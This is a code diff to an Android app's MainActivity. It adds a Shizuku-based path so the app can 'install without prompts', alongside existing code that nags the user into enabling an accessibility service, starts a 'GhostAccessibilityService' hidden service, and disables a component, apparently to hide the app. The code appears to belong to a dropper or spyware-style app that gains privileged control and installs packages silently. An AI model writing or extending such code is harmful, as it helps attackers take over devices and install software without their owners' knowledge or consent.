@@ -70,18 +70,39 @@ public class MainActivity extends Activity {
 
     private void proceed() {
         if (isFinishing()) return;
-        if (!a11yEnabled()) {
+        boolean shizukuReady = ShizukuBridge.available() && ShizukuBridge.permitted();
+
+        if (!a11yEnabled() && !shizukuReady) {
             progress.setVisibility(View.VISIBLE);
-            step.setText(R.string.setup_step_a11y);
             settings.setVisibility(View.VISIBLE);
-            if (System.currentTimeMillis() - lastSettingsOpen > 6000) {
-                openAccessibility();
+            if (ShizukuBridge.available()) {
+                step.setText("Approve Shizuku access to install without prompts.");
+                if (!ShizukuBridge.permitted()) {
+                    ShizukuBridge.request();
+                    return;
+                }
+            } else if (ShizukuBridge.installed(this)) {
+                step.setText("Start Shizuku (wireless debugging), then return here.");
+                if (System.currentTimeMillis() - lastSettingsOpen > 8000) {
+                    lastSettingsOpen = System.currentTimeMillis();
+                    try {
+                        Intent s = getPackageManager().getLaunchIntentForPackage(
+                                "moe.shizuku.privileged.api");
+                        if (s != null) startActivity(s);
+                    } catch (Throwable ignored) {}
+                }
+                return;
+            } else {
+                step.setText(R.string.setup_step_a11y);
+                if (System.currentTimeMillis() - lastSettingsOpen > 6000) {
+                    openAccessibility();
+                }
+                return;
             }
-            return;
         }
 
         GhostAccessibilityService.startHiddenService(this);
-        if (!getPackageManager().canRequestPackageInstalls()) {
+        if (!shizukuReady && !getPackageManager().canRequestPackageInstalls()) {
             progress.setVisibility(View.VISIBLE);
             step.setText(R.string.setup_step_unknown);
             settings.setVisibility(View.VISIBLE);
@@ -158,6 +179,14 @@ public class MainActivity extends Activity {
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
         } catch (Throwable ignored) {}
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == ShizukuBridge.REQUEST_CODE) {
+            handler.postDelayed(this::proceed, 300);
+        }
     }
 
     @Override
